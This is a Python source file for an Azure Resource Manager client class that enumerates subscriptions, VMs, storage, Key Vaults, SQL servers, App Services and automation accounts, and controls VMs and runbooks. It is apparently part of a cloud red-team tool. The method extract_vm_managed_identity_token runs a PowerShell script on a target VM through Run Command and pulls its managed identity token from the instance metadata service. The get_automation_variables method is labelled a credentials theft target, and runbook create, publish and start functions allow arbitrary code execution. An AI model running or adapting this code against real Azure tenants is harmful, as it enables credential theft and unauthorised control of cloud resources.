"""
ARM Service - Azure Resource Manager enumeration
VMs, Storage, KeyVault, SQL, App Services, Automation
+ FIX: Public IP implementation with single API call + matching
+ FIX: get_runbook_content without double slash
"""
import requests
import time


class ARMService:
    
    def __init__(self, access_token):
        self.access_token = access_token
        self.base_url = 'https://management.azure.com'
        self.api_version = '2023-07-01'
        self.timeout = 30
    
    def _make_request(self, endpoint, method='GET', json_data=None, **kwargs):
        """Make request to ARM API with retry logic"""
        # Ensure "/" prefix
        if not endpoint.startswith('/'):
            endpoint = '/' + endpoint
        
        url = f"{self.base_url}{endpoint}"
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                response = requests.request(
                    method,
                    url,
                    headers=headers,
                    timeout=self.timeout,
                    json=json_data,
                    **kwargs
                )
                
                if response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 5))
                    print(f"[429 Rate Limit] Waiting {retry_after}s...")
                    time.sleep(retry_after)
                    continue
                
                if response.status_code in [200, 201, 202, 204]:
                    if response.status_code == 204 or not response.content:
                        return {'success': True, 'data': {}}
                    return {'success': True, 'data': response.json()}
                else:
                    error_detail = response.text
                    error_code = None
                    try:
                        error_json = response.json()
                        if 'error' in error_json:
                            error_detail = error_json['error'].get('message', response.text)
                            error_code = error_json['error'].get('code', None)
                    except:
                        pass
                    
                    print(f"[ARM ERROR] {method} {url}")
                    print(f"[ARM ERROR] Status: {response.status_code}")
                    if error_code:
                        print(f"[ARM ERROR] Code: {error_code}")
                    print(f"[ARM ERROR] Message: {error_detail}")
                    
                    is_permission_denied = (
                        response.status_code == 403 or
                        'Forbidden' in str(error_detail) or
                        'Insufficient privileges' in str(error_detail)
                    )
                    
                    result = {
                        'success': False,
                        'error': f'ARM API returned {response.status_code}',
                        'details': error_detail,
                        'error_code': error_code
                    }
                    
                    if is_permission_denied:
                        result['permission_denied'] = True
                    
                    return result
                    
            except requests.exceptions.Timeout:
                return {'success': False, 'error': 'Request timeout'}
            except requests.exceptions.RequestException as e:
                return {'success': False, 'error': str(e)}
        
        return {'success': False, 'error': 'Max retries exceeded'}
    
    # ==================== SUBSCRIPTIONS ====================
    
    def get_subscriptions(self):
        """Get all Azure subscriptions"""
        result = self._make_request(f'/subscriptions?api-version={self.api_version}')
        
        if result['success']:
            subs = result['data'].get('value', [])
            return {
                'success': True,
                'subscriptions': [{
                    'id': s.get('subscriptionId'),
                    'displayName': s.get('displayName'),
                    'state': s.get('state'),
                    'tenantId': s.get('tenantId')
                } for s in subs]
            }
        
        return result
    
    # ==================== RESOURCE GROUPS ====================
    
    def get_resource_groups(self, subscription_id):
        """Get resource groups for subscription"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/resourcegroups?api-version={self.api_version}'
        )
        
        if result['success']:
            rgs = result['data'].get('value', [])
            return {
                'success': True,
                'resource_groups': [{
                    'name': rg.get('name'),
                    'location': rg.get('location'),
                    'id': rg.get('id'),
                    'tags': rg.get('tags', {})
                } for rg in rgs]
            }
        
        return result
    
    # ==================== PUBLIC IPS ====================
    
    def get_public_ips(self, subscription_id):
        """
        Get ALL public IPs in subscription
        Returns dict: {nic_id: public_ip_address}
        """
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.Network/publicIPAddresses?api-version=2023-05-01'
        )
        
        if not result['success']:
            return {}
        
        public_ips = result['data'].get('value', [])
        
        # Build mapping: {ip_config_id: public_ip_address}
        ip_mapping = {}
        
        for pip in public_ips:
            ip_address = pip.get('properties', {}).get('ipAddress')
            ip_config = pip.get('properties', {}).get('ipConfiguration', {})
            ip_config_id = ip_config.get('id') if ip_config else None
            
            if ip_address and ip_config_id:
                ip_mapping[ip_config_id] = ip_address
        
        return ip_mapping
    
    # ==================== VIRTUAL MACHINES ====================
    
    def get_virtual_machines(self, subscription_id, subscription_name=None):
        """Get all VMs in subscription with Public IP"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01'
        )
        
        if not result['success']:
            return result
        
        vms = result['data'].get('value', [])
        
        # Get ALL public IPs once
        print(f"[VM] Fetching public IPs for subscription...")
        public_ip_mapping = self.get_public_ips(subscription_id)
        print(f"[VM] Found {len(public_ip_mapping)} public IP mappings")
        
        vm_list = []
        
        for vm in vms:
            # Extract resource group
            resource_group = vm.get('id').split('/')[4] if vm.get('id') else None
            
            # Get storage profile for disks count
            storage_profile = vm.get('properties', {}).get('storageProfile', {})
            data_disks = storage_profile.get('dataDisks', [])
            disks_count = 1 + len(data_disks)  # OS disk + data disks
            
            # Get network interfaces
            network_profile = vm.get('properties', {}).get('networkProfile', {})
            network_interfaces = network_profile.get('networkInterfaces', [])
            
            # Try to find public IP from NICs
            public_ip = None
            for nic_ref in network_interfaces:
                nic_id = nic_ref.get('id')
                if not nic_id:
                    continue
                
                # Get NIC details to find IP configuration
                nic_result = self._make_request(f'{nic_id}?api-version=2023-05-01')
                if nic_result['success']:
                    nic_data = nic_result['data']
                    ip_configs = nic_data.get('properties', {}).get('ipConfigurations', [])
                    
                    for ip_config in ip_configs:
                        ip_config_id = ip_config.get('id')
                        if ip_config_id in public_ip_mapping:
                            public_ip = public_ip_mapping[ip_config_id]
                            break
                
                if public_ip:
                    break
            
            vm_data = {
                'name': vm.get('name'),
                'location': vm.get('location'),
                'id': vm.get('id'),
                'resourceGroup': resource_group,
                'vmSize': vm.get('properties', {}).get('hardwareProfile', {}).get('vmSize'),
                'osType': vm.get('properties', {}).get('storageProfile', {}).get('osDisk', {}).get('osType'),
                'provisioningState': vm.get('properties', {}).get('provisioningState'),
                'vmId': vm.get('properties', {}).get('vmId'),
                'tags': vm.get('tags', {}),
                'subscription': subscription_name or subscription_id,
                'publicIpAddress': public_ip,
                'disksCount': disks_count
            }
            
            vm_list.append(vm_data)
        
        return {
            'success': True,
            'virtual_machines': vm_list
        }
    
    def get_vm_status(self, vm_id):
        """Get VM power state"""
        result = self._make_request(
            f'{vm_id}/instanceView?api-version=2023-03-01'
        )
        
        if result['success']:
            instance_view = result['data']
            statuses = instance_view.get('statuses', [])
            
            power_state = 'unknown'
            for status in statuses:
                code = status.get('code', '')
                if code.startswith('PowerState/'):
                    power_state = code.split('/')[-1]
                    break
            
            return {
                'success': True,
                'powerState': power_state,
                'statuses': statuses
            }
        
        return result
    
    def start_vm(self, vm_id):
        """Start a VM"""
        result = self._make_request(
            f'{vm_id}/start?api-version=2023-03-01',
            method='POST'
        )
        
        if result['success']:
            return {'success': True, 'message': 'VM start initiated'}
        
        return result
    
    def stop_vm(self, vm_id):
        """Stop a VM (powerOff, keeps allocation)"""
        result = self._make_request(
            f'{vm_id}/powerOff?api-version=2023-03-01',
            method='POST'
        )
        
        if result['success']:
            return {'success': True, 'message': 'VM stop initiated'}
        
        return result
    
    def restart_vm(self, vm_id):
        """Restart a VM"""
        result = self._make_request(
            f'{vm_id}/restart?api-version=2023-03-01',
            method='POST'
        )
        
        if result['success']:
            return {'success': True, 'message': 'VM restart initiated'}
        
        return result
    
    def deallocate_vm(self, vm_id):
        """Deallocate a VM (full shutdown, releases resources)"""
        result = self._make_request(
            f'{vm_id}/deallocate?api-version=2023-03-01',
            method='POST'
        )
        
        if result['success']:
            return {'success': True, 'message': 'VM deallocate initiated'}
        
        return result
    
    def vm_run_command(self, vm_id, command_id, script, parameters=None):
        """Execute command on VM via Azure Run Command (with async polling)"""
        # Ensure script is a list
        if isinstance(script, str):
            script = [script]
        
        # Build request body
        json_data = {
            'commandId': command_id,
            'script': script
        }
        
        # Add parameters if provided
        if parameters:
            json_data['parameters'] = parameters
        
        # Ensure vm_id has leading slash
        if not vm_id.startswith('/'):
            vm_id = '/' + vm_id
        
        url = f"{self.base_url}{vm_id}/runCommand?api-version=2023-03-01"
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }
        
        print(f"[VM Run Command] Executing {command_id} on VM")
        print(f"[VM Run Command] Script: {script}")
        
        try:
            # Step 1: Send run command (returns 202 Accepted with async operation URL)
            response = requests.post(url, headers=headers, json=json_data, timeout=self.timeout)
            
            print(f"[VM Run Command] Response status: {response.status_code}")
            print(f"[VM Run Command] Response headers: {dict(response.headers)}")
            
            if response.status_code == 200:
                # Sync response - command completed immediately (rare)
                result_data = response.json()
                return self._parse_run_command_result(result_data)
            
            elif response.status_code == 202:
                # Async response - need to poll
                async_url = response.headers.get('Azure-AsyncOperation') or response.headers.get('Location')
                
                if not async_url:
                    print("[VM Run Command] No async operation URL in headers!")
                    return {
                        'success': False,
                        'error': 'No async operation URL returned by Azure'
                    }
                
                print(f"[VM Run Command] Polling async operation: {async_url}")
                
                # Step 2: Poll the async operation URL
                max_polls = 40  # 40 * 3 = 120 seconds
                poll_interval = 3
                
                for attempt in range(max_polls):
                    time.sleep(poll_interval)
                    
                    poll_response = requests.get(async_url, headers=headers, timeout=self.timeout)
                    
                    if poll_response.status_code == 200:
                        poll_data = poll_response.json()
                        status = poll_data.get('status', '')
                        
                        print(f"[VM Run Command] Poll {attempt + 1}: Status={status}")
                        
                        if status == 'Succeeded':
                            # Get the final result
                            print(f"[VM Run Command] Command succeeded!")
                            
                            # The result might be in the poll_data or we need to fetch it
                            if 'properties' in poll_data or 'output' in poll_data:
                                return self._parse_run_command_result(poll_data)
                            
                            # Try to get result from original endpoint
                            result_response = requests.post(url, headers=headers, json=json_data, timeout=self.timeout)
                            if result_response.status_code == 200:
                                return self._parse_run_command_result(result_response.json())
                            
                            # Fallback
                            return {
                                'success': True,
                                'output': str(poll_data),
                                'executionTime': f'{(attempt + 1) * poll_interval}s'
                            }
                        
                        elif status in ['Failed', 'Canceled']:
                            error = poll_data.get('error', {})
                            return {
                                'success': False,
                                'error': error.get('message', f'Command {status}'),
                                'details': str(poll_data)
                            }
                
                # Timeout
                return {
                    'success': False,
                    'error': f'Command execution timeout (>{max_polls * poll_interval}s)'
                }
            
            else:
                # Error response
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', response.text)
                except:
                    error_msg = response.text
                
                print(f"[VM Run Command] Error: {response.status_code} - {error_msg}")
                return {
                    'success': False,
                    'error': f'ARM API returned {response.status_code}: {error_msg}'
                }
        
        except Exception as e:
            print(f"[VM Run Command] Exception: {e}")
            import traceback
            traceback.print_exc()
            return {
                'success': False,
                'error': str(e)
            }
    
    def _parse_run_command_result(self, data):
        """Parse Azure Run Command result"""
        if isinstance(data, dict):
            # Format 1: Direct value array
            if 'value' in data:
                values = data['value']
                if isinstance(values, list):
                    return self._extract_stdout_stderr(values)
            
            # Format 2: properties.output.value (from async operation)
            if 'properties' in data:
                props = data['properties']
                if 'output' in props:
                    output = props['output']
                    if isinstance(output, dict) and 'value' in output:
                        return self._extract_stdout_stderr(output['value'])
                    else:
                        return {
                            'success': True,
                            'output': str(output)
                        }
        
        # Fallback - return raw data
        return {
            'success': True,
            'output': str(data)
        }
    
    def _extract_stdout_stderr(self, values):
        """Extract stdout/stderr from value array"""
        stdout = ''
        stderr = ''
        
        for item in values:
            code = item.get('code', '')
            message = item.get('message', '')
            
            if 'StdOut' in code:
                stdout = message
            elif 'StdErr' in code:
                stderr = message
        
        # Return only stdout if successful
        if stdout:
            result = {
                'success': True,
                'output': stdout
            }
            if stderr:
                result['stderr'] = stderr
            return result
        elif stderr:
            return {
                'success': False,
                'error': 'Command produced stderr output',
                'output': stderr
            }
        
        # No output found
        return {
            'success': True,
            'output': ''
        }
    
    # ==================== STORAGE ====================
    
    def get_storage_accounts(self, subscription_id):
        """Get all storage accounts"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01'
        )
        
        if result['success']:
            accounts = result['data'].get('value', [])
            return {
                'success': True,
                'storage_accounts': [{
                    'name': a.get('name'),
                    'location': a.get('location'),
                    'id': a.get('id'),
                    'resourceGroup': a.get('id').split('/')[4] if a.get('id') else None,
                    'primaryLocation': a.get('properties', {}).get('primaryLocation'),
                    'statusOfPrimary': a.get('properties', {}).get('statusOfPrimary'),
                    'supportsHttpsTrafficOnly': a.get('properties', {}).get('supportsHttpsTrafficOnly'),
                    'allowBlobPublicAccess': a.get('properties', {}).get('allowBlobPublicAccess'),
                    'minimumTlsVersion': a.get('properties', {}).get('minimumTlsVersion'),
                    'tags': a.get('tags', {})
                } for a in accounts]
            }
        
        return result
    
    def extract_vm_managed_identity_token(self, vm_id, resource="https://management.azure.com/"):
        """
        Extract Managed Identity token from VM via IMDS endpoint (RED TEAM)
        
        Uses Run Command to execute curl against Azure Instance Metadata Service
        to retrieve access token for the VM's Managed Identity.
        
        Args:
            vm_id: Full resource ID of the VM
            resource: Resource to request token for (default: ARM API)
        
        Returns:
            dict with token, expires_on, and decoded claims
        """
        # PowerShell script to extract token from IMDS
        # Using Invoke-RestMethod which handles JSON automatically
        ps_script = f"""
$ErrorActionPreference = 'Stop'
try {{
    $response = Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}' -Method GET -Headers @{{Metadata="true"}}
    $response | ConvertTo-Json -Compress
}} catch {{
    Write-Output "ERROR: $_"
    exit 1
}}
"""
        
        # Execute via Run Command
        result = self.vm_run_command(
            vm_id=vm_id,
            command_id='RunPowerShellScript',
            script=[ps_script]
        )
        
        if not result.get('success'):
            return {
                'success': False,
                'error': result.get('error', 'Failed to execute Run Command')
            }
        
        # Parse output
        output = result.get('output', '')
        
        if 'ERROR:' in output:
            return {
                'success': False,
                'error': f'Managed Identity not enabled or accessible: {output}'
            }
        
        # Parse JSON response
        try:
            import json
            import base64
            
            # Clean output (remove whitespace/newlines)
            output_clean = output.strip()
            token_data = json.loads(output_clean)
            
            access_token = token_data.get('access_token')
            expires_on = token_data.get('expires_on')
            
            if not access_token:
                return {
                    'success': False,
                    'error': 'No access_token in response'
                }
            
            # Decode JWT claims (without verification, just for display)
            token_parts = access_token.split('.')
            if len(token_parts) >= 2:
                # Decode payload (add padding if needed)
                payload = token_parts[1]
                padding = len(payload) % 4
                if padding:
                    payload += '=' * (4 - padding)
                
                try:
                    claims_json = base64.urlsafe_b64decode(payload)
                    claims = json.loads(claims_json)
                except Exception as e:
                    claims = {'decode_error': str(e)}
            else:
                claims = {}
            
            # Extract OID from claims for identity resolution
            oid = claims.get('oid') or claims.get('sub')
            identity_info = None
            
            # Try to resolve Managed Identity displayName via Graph API
            if oid:
                try:
                    import requests
                    
                    # Try to call Graph API to resolve Service Principal
                    # Note: This requires the calling user to have a Graph token
                    # We'll try with the current ARM token first (might fail with 401)
                    graph_url = f'https://graph.microsoft.com/v1.0/servicePrincipals/{oid}'
                    graph_headers = {
                        'Authorization': f'Bearer {self.access_token}',
                        'Content-Type': 'application/json'
                    }
                    
                    graph_response = requests.get(graph_url, headers=graph_headers, timeout=10)
                    
                    if graph_response.status_code == 200:
                        sp_data = graph_response.json()
                        identity_info = {
                            'oid': oid,
                            'displayName': sp_data.get('displayName'),
                            'appId': sp_data.get('appId'),
                            'servicePrincipalType': sp_data.get('servicePrincipalType')
                        }
                    else:
                        # Token doesn't have Graph permissions, just use OID
                        identity_info = {
                            'oid': oid,
                            'displayName': None,
                            'resolution_error': 'No Graph permissions'
                        }
                except Exception as e:
                    # If resolution fails, just continue without it
                    identity_info = {
                        'oid': oid,
                        'displayName': None,
                        'resolution_error': str(e)
                    }
            
            return {
                'success': True,
                'access_token': access_token,
                'expires_on': expires_on,
                'resource': resource,
                'claims': claims,
                'identity': identity_info,  # Added identity info
                'vm_id': vm_id
            }
            
        except json.JSONDecodeError as e:
            return {
                'success': False,
                'error': f'Failed to parse JSON response: {str(e)}',
                'raw_output': output
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Token extraction failed: {str(e)}',
                'raw_output': output
            }
    
    # ==================== KEY VAULTS ====================
    
    def get_key_vaults(self, subscription_id):
        """Get all Key Vaults"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01'
        )
        
        if result['success']:
            vaults = result['data'].get('value', [])
            return {
                'success': True,
                'key_vaults': [{
                    'name': v.get('name'),
                    'location': v.get('location'),
                    'id': v.get('id'),
                    'resourceGroup': v.get('id').split('/')[4] if v.get('id') else None,
                    'vaultUri': v.get('properties', {}).get('vaultUri'),
                    'enabledForDeployment': v.get('properties', {}).get('enabledForDeployment'),
                    'enabledForTemplateDeployment': v.get('properties', {}).get('enabledForTemplateDeployment'),
                    'enableSoftDelete': v.get('properties', {}).get('enableSoftDelete'),
                    'softDeleteRetentionInDays': v.get('properties', {}).get('softDeleteRetentionInDays'),
                    'tags': v.get('tags', {})
                } for v in vaults]
            }
        
        return result
    
    # ==================== SQL SERVERS ====================
    
    def get_sql_servers(self, subscription_id):
        """Get all SQL Servers"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.Sql/servers?api-version=2021-11-01'
        )
        
        if result['success']:
            servers = result['data'].get('value', [])
            return {
                'success': True,
                'sql_servers': [{
                    'name': s.get('name'),
                    'location': s.get('location'),
                    'id': s.get('id'),
                    'resourceGroup': s.get('id').split('/')[4] if s.get('id') else None,
                    'fullyQualifiedDomainName': s.get('properties', {}).get('fullyQualifiedDomainName'),
                    'administratorLogin': s.get('properties', {}).get('administratorLogin'),
                    'version': s.get('properties', {}).get('version'),
                    'publicNetworkAccess': s.get('properties', {}).get('publicNetworkAccess'),
                    'minimalTlsVersion': s.get('properties', {}).get('minimalTlsVersion'),
                    'tags': s.get('tags', {})
                } for s in servers]
            }
        
        return result
    
    # ==================== APP SERVICES ====================
    
    def get_app_services(self, subscription_id):
        """Get all App Services"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.Web/sites?api-version=2022-09-01'
        )
        
        if result['success']:
            sites = result['data'].get('value', [])
            return {
                'success': True,
                'app_services': [{
                    'name': s.get('name'),
                    'location': s.get('location'),
                    'id': s.get('id'),
                    'kind': s.get('kind'),
                    'state': s.get('properties', {}).get('state'),
                    'defaultHostName': s.get('properties', {}).get('defaultHostName'),
                    'tags': s.get('tags', {})
                } for s in sites]
            }
        
        return result
    
    # ==================== AUTOMATION ACCOUNTS ====================
    
    def get_automation_accounts(self, subscription_id):
        """Get Automation Accounts"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.Automation/automationAccounts?api-version=2023-11-01'
        )
        
        if result['success']:
            accounts = result['data'].get('value', [])
            return {
                'success': True,
                'automation_accounts': [{
                    'name': a.get('name'),
                    'location': a.get('location'),
                    'id': a.get('id'),
                    'resourceGroup': a.get('id').split('/')[4] if a.get('id') else None,
                    'state': a.get('properties', {}).get('state'),
                    'creationTime': a.get('properties', {}).get('creationTime'),
                    'lastModifiedTime': a.get('properties', {}).get('lastModifiedTime'),
                    'tags': a.get('tags', {})
                } for a in accounts]
            }
        
        return result
    
    def get_automation_account(self, automation_account_id):
        """Get single Automation Account"""
        result = self._make_request(
            f'{automation_account_id}?api-version=2023-11-01'
        )
        
        if result['success']:
            account = result['data']
            return {
                'success': True,
                'automation_account': {
                    'name': account.get('name'),
                    'location': account.get('location'),
                    'id': account.get('id'),
                    'resourceGroup': account.get('id').split('/')[4] if account.get('id') else None,
                    'state': account.get('properties', {}).get('state'),
                    'creationTime': account.get('properties', {}).get('creationTime'),
                    'lastModifiedTime': account.get('properties', {}).get('lastModifiedTime'),
                    'sku': account.get('properties', {}).get('sku', {}).get('name'),
                    'tags': account.get('tags', {})
                }
            }
        
        return result
    
    # ==================== RUNBOOKS ====================
    
    def get_runbooks(self, automation_account_id):
        """Get all runbooks"""
        result = self._make_request(
            f'{automation_account_id}/runbooks?api-version=2023-11-01'
        )
        
        if result['success']:
            runbooks = result['data'].get('value', [])
            return {
                'success': True,
                'runbooks': [{
                    'name': r.get('name'),
                    'id': r.get('id'),
                    'runbookType': r.get('properties', {}).get('runbookType'),
                    'state': r.get('properties', {}).get('state'),
                    'creationTime': r.get('properties', {}).get('creationTime'),
                    'lastModifiedTime': r.get('properties', {}).get('lastModifiedTime'),
                    'description': r.get('properties', {}).get('description'),
                    'jobCount': r.get('properties', {}).get('jobCount'),
                    'logProgress': r.get('properties', {}).get('logProgress'),
                    'logVerbose': r.get('properties', {}).get('logVerbose')
                } for r in runbooks]
            }
        
        return result
    
    def get_runbook(self, runbook_id):
        """Get single runbook"""
        result = self._make_request(
            f'{runbook_id}?api-version=2023-11-01'
        )
        
        if result['success']:
            runbook = result['data']
            return {
                'success': True,
                'runbook': {
                    'name': runbook.get('name'),
                    'id': runbook.get('id'),
                    'runbookType': runbook.get('properties', {}).get('runbookType'),
                    'state': runbook.get('properties', {}).get('state'),
                    'creationTime': runbook.get('properties', {}).get('creationTime'),
                    'lastModifiedTime': runbook.get('properties', {}).get('lastModifiedTime'),
                    'description': runbook.get('properties', {}).get('description'),
                    'jobCount': runbook.get('properties', {}).get('jobCount'),
                    'parameters': runbook.get('properties', {}).get('parameters', {})
                }
            }
        
        return result
    
    def get_runbook_content(self, runbook_id):
        """
        Get runbook script content
        CRITICAL: /content endpoint returns PLAIN TEXT, not JSON!
        """
        # Ensure "/" prefix
        if not runbook_id.startswith('/'):
            runbook_id = '/' + runbook_id
        
        url = f"{self.base_url}{runbook_id}/content?api-version=2023-11-01"
        headers = {
            'Authorization': f'Bearer {self.access_token}'
        }
        
        try:
            print(f"[DEBUG] Fetching runbook content from: {url}")
            response = requests.get(url, headers=headers, timeout=self.timeout)
            
            if response.status_code == 200:
                # /content endpoint returns PLAIN TEXT (the script), not JSON
                content = response.text
                print(f"[DEBUG] Successfully fetched content, length: {len(content)}")
                return {
                    'success': True,
                    'content': content
                }
            else:
                error_detail = response.text
                try:
                    error_json = response.json()
                    if 'error' in error_json:
                        error_detail = error_json['error'].get('message', response.text)
                except:
                    pass
                
                print(f"[ARM ERROR] GET {url}")
                print(f"[ARM ERROR] Status: {response.status_code}")
                print(f"[ARM ERROR] Error: {error_detail}")
                
                return {
                    'success': False,
                    'error': f'Failed to fetch runbook content: {error_detail}'
                }
        except Exception as e:
            print(f"[ARM ERROR] Exception fetching runbook content: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def create_runbook(self, automation_account_id, runbook_name, runbook_type, description=None, tags=None):
        """Create a new runbook"""
        json_data = {
            'properties': {
                'runbookType': runbook_type,
                'logProgress': True,
                'logVerbose': True
            }
        }
        
        if description:
            json_data['properties']['description'] = description
        
        if tags:
            json_data['tags'] = tags
        
        result = self._make_request(
            f'{automation_account_id}/runbooks/{runbook_name}?api-version=2023-11-01',
            method='PUT',
            json_data=json_data
        )
        
        if result['success']:
            return {
                'success': True,
                'message': f'Runbook {runbook_name} created',
                'runbook': result['data']
            }
        
        return result
    
    def update_runbook_content(self, runbook_id, script_content):
        """Update runbook script content (Draft)"""
        if not runbook_id.startswith('/'):
            runbook_id = '/' + runbook_id
        
        url = f"{self.base_url}{runbook_id}/draft/content?api-version=2023-11-01"
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'text/plain'
        }
        
        try:
            response = requests.put(
                url,
                headers=headers,
                data=script_content.encode('utf-8'),
                timeout=self.timeout
            )
            
            if response.status_code in [200, 201, 202]:
                return {
                    'success': True,
                    'message': 'Runbook content updated'
                }
            else:
                error_detail = response.text
                try:
                    error_json = response.json()
                    if 'error' in error_json:
                        error_detail = error_json['error'].get('message', response.text)
                except:
                    pass
                
                return {
                    'success': False,
                    'error': f'Failed to update content: {response.status_code}',
                    'details': error_detail
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def publish_runbook(self, runbook_id):
        """Publish runbook (Draft → Published)"""
        result = self._make_request(
            f'{runbook_id}/publish?api-version=2023-11-01',
            method='POST'
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Runbook published successfully'
            }
        
        return result
    
    def delete_runbook(self, runbook_id):
        """Delete runbook"""
        result = self._make_request(
            f'{runbook_id}?api-version=2023-11-01',
            method='DELETE'
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Runbook deleted successfully'
            }
        
        return result
    
    def start_runbook(self, automation_account_id, runbook_name, parameters=None, run_on=None):
        """Start a runbook job"""
        import uuid
        job_name = str(uuid.uuid4())
        
        json_data = {
            'properties': {
                'runbook': {
                    'name': runbook_name
                }
            }
        }
        
        if parameters:
            json_data['properties']['parameters'] = parameters
        
        if run_on:
            json_data['properties']['runOn'] = run_on
        
        result = self._make_request(
            f'{automation_account_id}/jobs/{job_name}?api-version=2023-11-01',
            method='PUT',
            json_data=json_data
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Runbook job started',
                'job_id': job_name,
                'job': result['data']
            }
        
        return result
    
    def get_job_output(self, job_id):
        """Get runbook job output"""
        result = self._make_request(
            f'{job_id}/output?api-version=2023-11-01'
        )
        
        if result['success']:
            return {
                'success': True,
                'output': result['data']
            }
        
        return result
    
    def get_job_status(self, job_id):
        """Get runbook job status"""
        result = self._make_request(
            f'{job_id}?api-version=2023-11-01'
        )
        
        if result['success']:
            job = result['data']
            return {
                'success': True,
                'job': {
                    'id': job.get('id'),
                    'status': job.get('properties', {}).get('status'),
                    'creationTime': job.get('properties', {}).get('creationTime'),
                    'startTime': job.get('properties', {}).get('startTime'),
                    'endTime': job.get('properties', {}).get('endTime'),
                    'exception': job.get('properties', {}).get('exception'),
                    'runOn': job.get('properties', {}).get('runOn')
                }
            }
        
        return result
    
    # ==================== AUTOMATION VARIABLES ====================
    
    def get_automation_variables(self, automation_account_id):
        """Get all automation variables (credentials theft target)"""
        result = self._make_request(
            f'{automation_account_id}/variables?api-version=2023-11-01'
        )
        
        if result['success']:
            variables = result['data'].get('value', [])
            return {
                'success': True,
                'variables': [{
                    'name': v.get('name'),
                    'id': v.get('id'),
                    'value': v.get('properties', {}).get('value'),
                    'isEncrypted': v.get('properties', {}).get('isEncrypted', False),
                    'description': v.get('properties', {}).get('description'),
                    'creationTime': v.get('properties', {}).get('creationTime'),
                    'lastModifiedTime': v.get('properties', {}).get('lastModifiedTime')
                } for v in variables]
            }
        
        return result
    
    # ==================== HYBRID WORKER GROUPS ====================
    
    def get_hybrid_worker_groups(self, automation_account_id):
        """Get Hybrid Runbook Worker Groups"""
        result = self._make_request(
            f'{automation_account_id}/hybridRunbookWorkerGroups?api-version=2023-11-01'
        )
        
        if result['success']:
            groups = result['data'].get('value', [])
            return {
                'success': True,
                'hybrid_worker_groups': [{
                    'name': g.get('name'),
                    'id': g.get('id'),
                    'groupType': g.get('properties', {}).get('groupType'),
                    'credential': g.get('properties', {}).get('credential'),
                } for g in groups]
            }
        
        return result
    
    def get_hybrid_workers(self, automation_account_id, group_name):
        """Get Hybrid Workers in a group"""
        result = self._make_request(
            f'{automation_account_id}/hybridRunbookWorkerGroups/{group_name}/hybridRunbookWorkers?api-version=2023-11-01'
        )
        
        if result['success']:
            workers = result['data'].get('value', [])
            return {
                'success': True,
                'hybrid_workers': [{
                    'name': w.get('name'),
                    'id': w.get('id'),
                    'ip': w.get('properties', {}).get('ip'),
                    'registeredDateTime': w.get('properties', {}).get('registeredDateTime'),
                    'lastSeenDateTime': w.get('properties', {}).get('lastSeenDateTime'),
                    'vmResourceId': w.get('properties', {}).get('vmResourceId')
                } for w in workers]
            }
        
        return result
    
    # ==================== PERMISSIONS ====================
    
    def check_permissions(self, resource_id):
        """Check user permissions on resource"""
        result = self._make_request(
            f'{resource_id}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01'
        )
        
        if result['success']:
            permissions = result['data'].get('value', [])
            return {
                'success': True,
                'permissions': [{
                    'actions': p.get('actions', []),
                    'notActions': p.get('notActions', []),
                    'dataActions': p.get('dataActions', []),
                    'notDataActions': p.get('notDataActions', [])
                } for p in permissions]
            }
        
        return result
    
    def get_role_assignments(self, resource_id):
        """Get role assignments for resource"""
        result = self._make_request(
            f'{resource_id}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01'
        )
        
        if result['success']:
            assignments = result['data'].get('value', [])
            return {
                'success': True,
                'role_assignments': [{
                    'id': ra.get('id'),
                    'roleDefinitionId': ra.get('properties', {}).get('roleDefinitionId'),
                    'principalId': ra.get('properties', {}).get('principalId'),
                    'principalType': ra.get('properties', {}).get('principalType'),
                    'scope': ra.get('properties', {}).get('scope')
                } for ra in assignments]
            }
        
        return result
